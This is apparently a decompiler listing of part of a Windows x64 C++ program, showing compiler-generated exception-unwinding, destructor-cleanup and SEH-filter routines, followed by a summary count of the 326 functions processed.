undefined8 FUN_14005305e(undefined8 param_1,longlong param_2)

{
  std::basic_ios<char,std::char_traits<char>_>::setstate
            ((basic_ios<char,std::char_traits<char>_> *)
             ((longlong)*(int *)(**(longlong **)(param_2 + 0x40) + 4) +
             (longlong)*(longlong **)(param_2 + 0x40)),4,true);
  return 0;
}



/* ==================================================================== */
/* FUN_1400530a0 @ 1400530a0 */

void FUN_1400530a0(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x70) & 1) != 0) {
    *(uint *)(param_2 + 0x70) = *(uint *)(param_2 + 0x70) & 0xfffffffe;
    thunk_FUN_140023190(*(undefined8 *)(param_2 + 0x60));
  }
  return;
}



/* ==================================================================== */
/* FUN_1400530c6 @ 1400530c6 */

void FUN_1400530c6(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x70) & 2) != 0) {
    *(uint *)(param_2 + 0x70) = *(uint *)(param_2 + 0x70) & 0xfffffffd;
    thunk_FUN_140023190(*(undefined8 *)(param_2 + 0x60));
  }
  return;
}



/* ==================================================================== */
/* FUN_140053160 @ 140053160 */

void FUN_140053160(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x40) & 1) != 0) {
    *(uint *)(param_2 + 0x40) = *(uint *)(param_2 + 0x40) & 0xfffffffe;
    std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>
              ((basic_ios<char,std::char_traits<char>_> *)(*(longlong *)(param_2 + 0x50) + 0xa8));
  }
  return;
}



/* ==================================================================== */
/* FUN_1400531c0 @ 1400531c0 */

void FUN_1400531c0(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x24) & 1) != 0) {
    *(uint *)(param_2 + 0x24) = *(uint *)(param_2 + 0x24) & 0xfffffffe;
    thunk_FUN_14000e3a0(*(undefined8 *)(param_2 + 0x28));
  }
  return;
}



/* ==================================================================== */
/* FUN_1400531f0 @ 1400531f0 */

void FUN_1400531f0(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x20) & 1) != 0) {
    *(uint *)(param_2 + 0x20) = *(uint *)(param_2 + 0x20) & 0xfffffffe;
    thunk_FUN_140025000(*(undefined8 *)(param_2 + 0x40));
  }
  return;
}



/* ==================================================================== */
/* FUN_140053260 @ 140053260 */

void FUN_140053260(undefined8 param_1,longlong param_2)

{
  if ((*(uint *)(param_2 + 0x20) & 1) != 0) {
    *(uint *)(param_2 + 0x20) = *(uint *)(param_2 + 0x20) & 0xfffffffe;
    std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>
              ((basic_ios<char,std::char_traits<char>_> *)(*(longlong *)(param_2 + 0x30) + 0xb0));
  }
  return;
}



/* ==================================================================== */
/* FUN_1400532b0 @ 1400532b0 */

bool FUN_1400532b0(undefined8 *param_1)

{
  return *(int *)*param_1 == -0x3ffffffb;
}



/* ==================================================================== */
/* FUN_1400532c8 @ 1400532c8 */

void FUN_1400532c8(undefined8 param_1,longlong param_2)

{
  if (*(char *)(param_2 + 0x20) == '\0') {
    FUN_140051b94(*(undefined8 *)(param_2 + 0x60),*(undefined8 *)(param_2 + 0x68),
                  *(undefined8 *)(param_2 + 0x70),*(undefined8 *)(param_2 + 0x78));
  }
  return;
}



/* ==================================================================== */
/* FUN_1400532f4 @ 1400532f4 */

undefined4 FUN_1400532f4(undefined8 param_1,longlong param_2)

{
  undefined8 uVar1;
  undefined8 *puVar2;

  *(undefined8 *)(param_2 + 0x30) = param_1;
  *(undefined8 *)(param_2 + 0x28) = **(undefined8 **)(param_2 + 0x30);
  if (**(int **)(param_2 + 0x28) == -0x1f928c9d) {
    puVar2 = (undefined8 *)__current_exception();
    *puVar2 = *(undefined8 *)(param_2 + 0x28);
    uVar1 = *(undefined8 *)(*(longlong *)(param_2 + 0x30) + 8);
    puVar2 = (undefined8 *)__current_exception_context();
    *puVar2 = uVar1;
                    /* WARNING: Subroutine does not return */
    terminate();
  }
  *(undefined4 *)(param_2 + 0x20) = 0;
  return *(undefined4 *)(param_2 + 0x20);
}



/* ==================================================================== */
/* FUN_14005334f @ 14005334f */

void FUN_14005334f(undefined8 *param_1)

{
  _seh_filter_exe(*(undefined4 *)*param_1,param_1);
  return;
}



/* ==================================================================== */
/* FUN_1400533ac @ 1400533ac */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_1400533ac(void)

{
  undefined8 *_Memory;
  undefined8 *puVar1;

  while (_Memory = DAT_140a61280, DAT_140a61280 != (undefined8 *)0x0) {
    puVar1 = DAT_140a61280 + 1;
    DAT_140a61280 = (undefined8 *)*DAT_140a61280;
    puVar1 = (undefined8 *)(**(code **)(*(longlong *)*puVar1 + 0x10))();
    if (puVar1 != (undefined8 *)0x0) {
      (**(code **)*puVar1)(puVar1,1);
    }
    free(_Memory);
  }
  return;
}



/* Summary: functions=326, attempted=326, completed=323, failed=3, external=0, thunks=45 */
